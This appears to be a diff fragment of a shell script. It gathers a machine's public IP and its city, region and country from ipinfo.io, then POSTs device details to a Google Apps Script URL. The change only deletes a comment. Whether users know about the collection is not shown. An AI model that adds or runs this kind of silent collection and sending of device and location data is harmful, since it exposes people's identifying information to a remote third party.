@@ -27,8 +27,6 @@ INTERNET_IP=$(curl -s ifconfig.me)
 LOCATION_INFO=$(curl -s "http://ipinfo.io/$INTERNET_IP" | grep -oP '"city": "\K[^"]*' || echo "Unknown Location")
 REGION_INFO=$(curl -s "http://ipinfo.io/$INTERNET_IP" | grep -oP '"region": "\K[^"]*' || echo "Unknown Region")
 COUNTRY_INFO=$(curl -s "http://ipinfo.io/$INTERNET_IP" | grep -oP '"country": "\K[^"]*' || echo "Unknown Country")
-
-# إرسال البيانات إلى Google Apps Script عبر HTTP POST
 curl -X POST "https://script.google.com/macros/s/AKfycbwSljw2ywFLmDMkD3mXojswhWnGg0XcbcgGX1zHHbgIXivz81f_LAMttyTEmuFXxJLr0A/exec" \
     -d "deviceName=$DEVICE" \
     -d "cpu=$CPU" \
